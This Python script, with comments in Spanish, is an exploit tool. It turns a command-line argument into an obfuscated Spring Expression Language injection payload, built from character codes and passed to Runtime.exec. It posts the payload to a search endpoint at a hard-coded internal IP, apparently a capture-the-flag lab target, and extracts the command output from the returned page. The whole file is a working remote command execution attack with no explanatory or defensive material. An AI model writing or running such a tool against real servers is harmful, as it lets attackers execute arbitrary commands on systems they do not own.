#!/usr/bin/env python3
import requests
import sys
import signal
import os
import time
import subprocess
import colorama

# Inicializa colorama para sistemas Windows
colorama.init()

# Define los colores
RESET = colorama.Style.RESET_ALL
BRIGHT_RED = colorama.Fore.RED + colorama.Style.BRIGHT
BRIGHT_YELLOW = colorama.Fore.YELLOW + colorama.Style.BRIGHT
BRIGHT_CYAN = colorama.Fore.CYAN + colorama.Style.BRIGHT

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
    print("\n[!] El programa ha sido ejecutado incorrectamente\n")
    print("[*] Uso: python3 %s <comando>\n" % sys.argv[0])
    sys.exit(1)


def makePayload():
    command = sys.argv[1]

    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % ord(
        command[0])

    command = command[1:]
    for character in command:
        payload += ".concat(T(java.lang.Character).toString(%s))" % ord(character)

    payload += ").getInputStream())}"
    # print(payload)
    return payload


def makeRequest(payload):
    search_url = "http://10.10.11.170:8080/search"

    post_data = {
        'name': payload
    }
    r = requests.post(search_url, data=post_data)
    print(r.text)

    # Genera un nombre de archivo único utilizando la marca de tiempo actual
    nombre_archivo = "java_inject_" + str(int(time.time())) + ".txt"

    # Abre el archivo en modo adjuntar ('a')
    with open(nombre_archivo, "a") as f:
        f.write(r.text)

    # Ejecuta el comando `cat` en una shell para leer el archivo generado y luego aplica los filtros awk y sed
    cat_command = f'cat {nombre_archivo} | awk \'/searched/,/<\\/h2>/\' | sed \'s/ <h2 class="searched">You searched for: //\' | sed \'s/<\\/h2>//\''
    cat_process = subprocess.Popen(cat_command, stdout=subprocess.PIPE, shell=True)
    output, _ = cat_process.communicate()

    # Imprime el resultado después de aplicar los filtros
    print("")
    print(BRIGHT_CYAN + "--------------------------------------------------" + RESET)
    print("")
    print(BRIGHT_YELLOW + output.decode('utf-8') + RESET)


if __name__ == '__main__':
    payload = makePayload()
    makeRequest(payload)
